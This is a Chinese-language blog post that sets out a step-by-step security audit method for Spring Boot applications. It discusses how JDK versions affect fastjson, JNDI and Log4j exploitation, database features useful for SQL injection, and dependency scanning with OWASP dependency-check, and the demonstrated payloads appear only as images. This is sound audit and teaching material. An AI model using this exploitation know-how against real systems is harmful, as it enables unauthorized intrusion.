<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>公式化Java代码审计-SpringBoot | Seven1an's blog</title><meta name="author" content="Seven1an"><meta name="copyright" content="Seven1an"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="公式化Java代码审计-SpringBoot免责声明：本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏，否则造成一切后果与发表本文章的作者无关。 注：全文约7900字 前言“Spring Boot在Java开发中的占比非常高，特别是在微服务、云原生和企业级应用中，已经成为主流选择。”  所以，在渗透测试过程中，笔者对SpringBoot框架接触也是非常的多，这主要取决">
<meta property="og:type" content="article">
<meta property="og:title" content="公式化Java代码审计-SpringBoot">
<meta property="og:url" content="https://seven1an.github.io/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/index.html">
<meta property="og:site_name" content="Seven1an&#39;s blog">
<meta property="og:description" content="公式化Java代码审计-SpringBoot免责声明：本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏，否则造成一切后果与发表本文章的作者无关。 注：全文约7900字 前言“Spring Boot在Java开发中的占比非常高，特别是在微服务、云原生和企业级应用中，已经成为主流选择。”  所以，在渗透测试过程中，笔者对SpringBoot框架接触也是非常的多，这主要取决">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://seven1an.github.io/img/th.png">
<meta property="article:published_time" content="2024-10-11T03:07:31.000Z">
<meta property="article:modified_time" content="2024-10-17T08:21:43.714Z">
<meta property="article:author" content="Seven1an">
<meta property="article:tag" content="Seven1an">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://seven1an.github.io/img/th.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://seven1an.github.io/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/pluginsSrc/@fancyapps/ui/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.min.js',
      css: '/pluginsSrc/flickr-justified-gallery/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '公式化Java代码审计-SpringBoot',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-17 16:21:43'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/th.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Seven1an's blog"><span class="site-name">Seven1an's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">公式化Java代码审计-SpringBoot</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2024-10-11T03:07:31.000Z" title="发表于 2024-10-11 11:07:31">2024-10-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"></div></div></div><article class="post-content" id="article-container"><h1 id="公式化Java代码审计-SpringBoot"><a href="#公式化Java代码审计-SpringBoot" class="headerlink" title="公式化Java代码审计-SpringBoot"></a>公式化Java代码审计-SpringBoot</h1><p><strong>免责声明：本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏，否则造成一切后果与发表本文章的作者无关。</strong></p>
<p>注：全文约<strong>7900</strong>字</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“Spring Boot在Java开发中的占比非常高，特别是在微服务、云原生和企业级应用中，已经成为主流选择。” </p>
<p>所以，在渗透测试过程中，笔者对SpringBoot框架接触也是非常的多，这主要取决于遇到过大量的Swagger、Actuator的页面，后面我大概花费了一年的时间，去学习java开发（JavaSE -&gt; JavaWeb -&gt; SSM(Spring SpringMVC Mybatis) -&gt; SpringBoot）来使渗透测试以及代码审计过程中更有发现</p>
<p>奈何笔者愚笨，对开发仍然一知半解，但好在可以简单看懂了，也对功能点的测试有了新的思考</p>
<p>经过我一些日子的学习和实践，总结出了我针对SpringBoot框架代码审计的流程</p>
<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>为什么要叫公式化？</p>
<p>当我拿到一个SpringBoot框架的项目，会把审计过程分为<strong>三个阶段</strong>，文章后续也以这三个阶段为目录拓展</p>
<p><strong>我的代码审计原则是：一切为了漏洞发现和利用</strong></p>
<h4 id="前期-环境搭建"><a href="#前期-环境搭建" class="headerlink" title="前期(环境搭建)"></a>前期(环境搭建)</h4><p>​	在这个时期，不会接触到代码，我们需要把项目环境先搭建起来，阅读开发手册，选择什么环境、选择什么版本的组件都至关重要，漏洞利用是很复杂的，涉及的因素也非常多，我们需要留意如下几个特别点，而不是一股脑把程序跑起来就行</p>
<h5 id="JDK版本"><a href="#JDK版本" class="headerlink" title="JDK版本"></a>JDK版本</h5><p>​	大多数项目都只是说了运行要求的JDK大版本，也就是jdk1.7，jdk1.8，jdk11…</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015163551183.png" alt="image-20241015163551183"></p>
<p>or</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015171029289.png" alt="image-20241015171029289"></p>
<p>or</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012152334813.png" alt="image-20241012152334813"></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012152505587.png" alt="image-20241012152505587"></p>
<p>在不同jdk的版本中，有不同的功能被修改增加删除，这导致不同版本的jdk对我们的漏洞利用产生的影响无疑的巨大的，主要是小版本的细节问题</p>
<p>比如，在利用fastjson反序列化漏洞-BasicDataSource链的时候</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/1.png" alt="1"></p>
<p>执行了命令，利用成功</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011161248364.png" alt="image-20241011161248364"></p>
<p>利用失败，这是因为在<strong>jdk1.8_251之后移除了com.sun.org.apache.bcel.internal.util.ClassLoader这个类</strong>，而在这之前是可以用的</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011162535167.png" alt="image-20241011162535167"></p>
<p>还有一个jndi注入的例子</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011163648813.png" alt="image-20241011163648813"></p>
<p>成功</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011163818084.png" alt="image-20241011164021493"></p>
<p>利用失败</p>
<p>这里可以从请求情况看到，只是发送了ldap请求并没有请求到恶意类。</p>
<p>因为在<strong>Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载</strong></p>
<p>当然 这是可以绕过的</p>
<p>小版本的修改还有很多，这里大家可以去自行搜索学习，我就不一一举例了</p>
<p>可以看到小版本对于漏洞利用影响是多么的大，这里举例一个大版本的：Gopher协议利用SSRF</p>
<p>众所周知，在<code>rt.sun.net.www.protocol</code>包下负责实现Java对特定网络协议的支持</p>
<p>如图jdk1.7支持的协议</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011171037948.png" alt="image-20241011171037948"></p>
<p>可以看到gopher协议的</p>
<p>但是在jdk1.8中是没有</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011171204695.png" alt="image-20241011171204695"></p>
<p>这就意味着，当我们在小于jdk1.8的环境中利用SSRF漏洞，就要留意这个问题了</p>
<p>不同JDK影响Maven，进而影响依赖的问题，还会涉及到依赖传递，这展开说就太多了</p>
<p>这里引用大佬的一句话 </p>
<p>​		<strong>”应通过修复代码来彻底解决这个问题，而不应依赖于环境的安全增强来规避攻击“</strong></p>
<h5 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h5><p>比如，在MySQL中：日期函数如<code>NOW()</code>，返回当前时间。字符串函数如<code>CONCAT()</code>，用于拼接字符串</p>
<p>而到了PostgreSQL：函数CURRENT_TIMESTAMP，返回当前时间，字符串函数如||运算符，支持字符串拼接，而不是CONCAT()函数</p>
<p>PostgreSQL还有大量特有的函数，例如<code>GENERATE_SERIES()</code>可以生成一个序列，而MySQL中没有直接等价的函数</p>
<p>ACCESS没有库名，只有表和字段，并且注入时，后面必须跟表名，ACCESS没有注释</p>
<p>不同的数据库差别太大了，注释符、函数、语法、部署方式、依赖&#x2F;扩展…</p>
<p><strong>这直接影响了我们怎么构造SQL注入的语句</strong></p>
<p>​	</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011172022967.png" alt="image-20241011172022967"></p>
<p>对于这种多选一的，不知道大家会怎么选，我个人更倾向于选择MySQL，主要是因为对其他数据库还不够熟悉</p>
<h5 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h5><p>最熟悉的就是，MySQL数据库5.0后加入的<code>INFORMATION_SCHEMA</code></p>
<p>比如PostgreSQL，在8.2加入了pg_sleep()延迟函数 </p>
<p>​	Link:<code>https://www.postgresql.org/docs/release/8.2.0/</code></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/%5B@%7BZ1O7A_R%6007%5DOZ%7BPBK%25%25A.png" alt="img"></p>
<p>以及SQL Server 2005 中引入的 xp_cmdshell</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241011175223652.png" alt="image-20241011175223652"></p>
<p>还有非常之多</p>
<h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><p>看这个为了了解项目整体结构。大致了解作者编写逻辑，搞清请求流程。</p>
<p>SpringBoot继承了 Spring 的传统，集成了 Spring MVC，几乎所有的Spring Boot 项目默认使用 MVC 架构</p>
<p>目录如下</p>
<p>​	<code>src/main</code>下面有两个目录，分别是<code>java</code>和<code>resources</code></p>
<p>​	<code>	java</code>目录中主要存放的是java代码，这里是<strong>重中之重</strong>！要搞清每个目录的含义，对于我们的在审计过程中，请求流程是怎么走的至关重要</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012140136600.png" alt="image-20241012140136600"></p>
<p>​	结合开发手册，配合自己的解读或者单纯看目录名，大概就知道是做什么的了</p>
<p>​	<code>	resources</code>目录中主要存放的是资源文件，比如：html、js、css等</p>
<p>​	个别项目还会引入<strong>jsp依赖</strong>，有<code>webapp</code>来存放jsp 但这种情况在SpringBoot项目中是非常少的，这里决定了如果出现文件上传漏洞能否上传webshell</p>
<p>​	一些README.MD中也会对目录给出大致说明</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012141846204.png" alt="image-20241012143423141"></p>
<p>​	 <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012143456115.jpeg" alt="img"></p>
<h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>​	这里主要是对<code>application.yml</code>、<code>application.properties</code></p>
<p>​	在这里发现了规定上传文件的大小</p>
<p>​     <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012144111251.png" alt="image-20241012144133612"></p>
<p>​	jwt秘钥</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012144251276.png" alt="image-20241012144251276"></p>
<p>​	甚至开启了ajp</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012145356583.png" alt="image-20241012145523606"></p>
<p>​	CORS跨域问题</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012145940385.png" alt="image-20241012145940385"></p>
<p>​	还有很多，比如AK&#x2F;SK、各种key等各类数据的硬编码，这都对我们的漏洞利用起着影响</p>
<p>前期我要说的就这些。主要是搭建环境的选择，如何更有利于我们对漏洞的利用，以及熟悉项目来帮助审计</p>
<h4 id="中期-手工审计"><a href="#中期-手工审计" class="headerlink" title="中期(手工审计)"></a>中期(手工审计)</h4><p>​	到了这里，就来到了代码审计过程中最重要的一个环节，开始从代码入手。为了这个公式化的流程，我分为三步并简单举例：</p>
<p>pom.xml、正向审计、逆向追踪</p>
<h5 id="POM"><a href="#POM" class="headerlink" title="POM"></a>POM</h5><p>我主要关注两点：</p>
<p>​	一、了解项目使用到的依赖，使用的依赖哪些有漏洞</p>
<p>​	二、反序列化相关类</p>
<p>如何快速发现pom中存在漏洞的依赖？</p>
<p>通过开发文档得知</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012154153022.png" alt="image-20241012154153022"></p>
<p>没有开发文档，或者一些项目不大 依赖不多，肉眼也是可以整理出来的</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012155130698.png" alt="image-20241012155130698"></p>
<p>这样直接搜组件漏洞即可</p>
<p>或者依靠idea的插件识别<code>Package Checker</code></p>
<p><a target="_blank" rel="noopener" href="https://plugins.jetbrains.com/plugin/18337-package-checker">https://plugins.jetbrains.com/plugin/18337-package-checker</a></p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012155408068.png" alt="image-20241012155531407"></p>
<p>​	</p>
<p>​	这里，有一个值得一提的地方，就是依赖传递的问题。比如当年的log4j，影响范围之所以那么大，确实与依赖传递有很大关系。也就是 父pom 引用了一个带漏洞的依赖，我们直接在当前pom是看不到的。</p>
<p>​	我们需要了解一下pom的工作方式：</p>
<ol>
<li><code>pom.xml</code> 是当前模块的配置文件：每个 Maven 项目或模块都有一个 <code>pom.xml</code> 文件，它是当前模块的配置，包括依赖、插件、编译设置等内容。</li>
<li>Maven 项目可以通过继承另一个 pom 文件，通常是一个父  pom 。例如，Spring Boot 项目常常继承 <code>spring-boot-starter-parent</code></li>
<li>父  pom  中定义的依赖管理、插件管理、属性等内容会传递给子模块</li>
<li>项目的实际依赖和配置不只是当前 <code>pom.xml</code> 文件中列出的内容，还包括从父 pom 和其他传递依赖中继承过来的部分。因此，<strong>当前的 <code>pom.xml</code> 只是部分配置</strong>，并不是最终生效的 pom</li>
</ol>
<p>​	也就是说，我们上面直接通过当前<code>pom.xml</code>去筛选，查看对应依赖有没有漏洞，这完全忽略了这种情况，如果父 pom 也就是被传递的依赖有漏洞呢，我们如何查看和确认？</p>
<p>​	首先，大多数父 pom 几乎都是官方 pom，这些官方父 pom 通常经过维护和定期更新，以解决已知问题和漏洞。但发现漏洞依然是有可能的，因为更新不是实时的，而且每个使用者配置也都是不一样的，使用者也未必进行了更新，或者依赖之间的版本兼容问题。</p>
<p>​	<strong>对于POM的审计，主要还是看当前pom.xml的依赖</strong></p>
<p>​	如何获取最终 pom</p>
<p>​	<code>mvn help:effective-pom</code></p>
<p>​	这个命令会生成项目的 有效 pom，它是所有继承的父 POM 和依赖管理都解析后形成的完整 pom 文件</p>
<p>​	原本147行的pom，最后生成了5500行</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012163631899.png" alt="image-20241012163631899"></p>
<p>​	在effective-pom中，看到了tomcat的版本</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012163818089.png" alt="image-20241012165720228"></p>
<p>​	这个版本有对应着 Apache Tomcat HTTP&#x2F;2 拒绝服务漏洞（CVE-2020-11996），就不做复现记录了</p>
<p>​	最终的POM代码量太大，我们依靠工具去检测，<code>dependency-check</code> ，它会分析项目的依赖树，并检查依赖库是否包含已知的安全漏洞，也就是检测最终的POM</p>
<p>​	申请nvdApiKey，<a target="_blank" rel="noopener" href="https://nvd.nist.gov/developers/request-an-api-key">https://nvd.nist.gov/developers/request-an-api-key</a></p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012174508843.png" alt="image-20241012174508843"></p>
<p>​	在代码工程的 pom.xml 文件中添加插件依赖</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        ......</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.owasp&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">10.0</span><span class="number">.3</span>&lt;/version&gt;</span><br><span class="line">            &lt;configuration&gt;</span><br><span class="line">                &lt;autoUpdate&gt;<span class="literal">true</span>&lt;/autoUpdate&gt;</span><br><span class="line">                &lt;nvdApiKey&gt;6d88f39a-aa0a-<span class="number">4312</span>-xxxx-xxxxxxxxxxx&lt;/nvdApiKey&gt;</span><br><span class="line">            &lt;/configuration&gt;</span><br><span class="line">            &lt;executions&gt;</span><br><span class="line">                &lt;execution&gt;</span><br><span class="line">                    &lt;goals&gt;</span><br><span class="line">                        &lt;goal&gt;check&lt;/goal&gt;</span><br><span class="line">                    &lt;/goals&gt;</span><br><span class="line">                &lt;/execution&gt;</span><br><span class="line">            &lt;/executions&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure>

<p>​	更多配置参数详解官方文档： <code>https://jeremylong.github.io/DependencyCheck/dependency-check-cli/arguments.html</code></p>
<p>​	然后在Maven模块中点击check即可</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012174747869.png" alt="image-20241012174747869"></p>
<p>​	运行成功后，会在target 目录下产生<code>dependency-check-report.html </code></p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012174915573.png" alt="image-20241012174915573"></p>
<p>输出文档非常全面</p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012175010727.png" alt="image-20241012175018262"></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012175110192.png" alt="image-20241012175110192"></p>
<p>一个简单的例子:</p>
<p>​	 <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014104456670.png" alt="image-20241014104456670"></p>
<p>​	可以看到Log4j2版本为2.10.0，此版本存在远程代码执行漏洞(CVE-2021-44228)</p>
<p>​	全局搜索关键字<code>logger.info</code>或<code>logger.error</code>，只是有的项目用前者，有的项目用后者，这两个本质是一样的，这都可以触发漏洞的，不过是记录信息不一样</p>
<p>​	这个项目中是用的<code>logger.info</code></p>
<p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014113654900.png" alt="image-20241014113840129"></p>
<p>​	找到拼接变量参数的地方，并确认哪些参数是可控的</p>
<p>​	经过测试发现多出可用，这里随机演示一个</p>
<p>​	 <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014165950492.png" alt="image-20241014165950492"></p>
<p>  向上追踪orderBy，发现是一个排序的字段</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/Users\iqq77\AppData\Roaming\Typora\typora-user-images\image-20241014170040274.png" alt="image-20241014170040274"></p>
<p>​	根据注释和映射路径，我们移步到功能点处测试验证</p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014170209422.png" alt="image-20241014170209422"></p>
<p>​	<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014170236989.png" alt="image-20241014170236989"></p>
<p>​	留意url编码<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014170343462.png" alt="image-20241014170442218"></p>
<p>​	成功</p>
<p>关于第一点，总结pom审计大概流程</p>
<p>​	1、确认版本有无漏洞	</p>
<p>​	2、找到漏洞关键函数|有些依赖的漏洞可以直接利用</p>
<p>​	3、确认参数是否可控</p>
<p>第二点，<strong>由于笔者水平有限，并不具备挖新链的能力，所以主要体现在漏洞利用上面，为了不误导大家，我举例说明</strong></p>
